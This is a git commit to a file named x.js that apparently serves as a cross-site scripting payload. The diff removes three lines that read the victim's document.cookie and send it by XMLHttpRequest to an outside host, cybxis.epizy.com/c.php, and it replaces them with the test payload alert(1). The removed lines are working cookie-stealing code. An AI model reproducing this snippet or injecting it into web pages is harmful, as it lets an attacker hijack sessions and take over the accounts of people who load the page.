be459d469b4551821286dc35e2c1f887ad5f8e51
cybxis <63922811+cybxis@users.noreply.github.com>
2023-02-09 23:30:34 +0800

    Update x.js

--- x.js
+++ x.js
@@ -1,3 +1,1 @@
-var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://cybxis.epizy.com/c.php?c='+document.cookie, true); 
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
-xhr.send();
+alert(1);
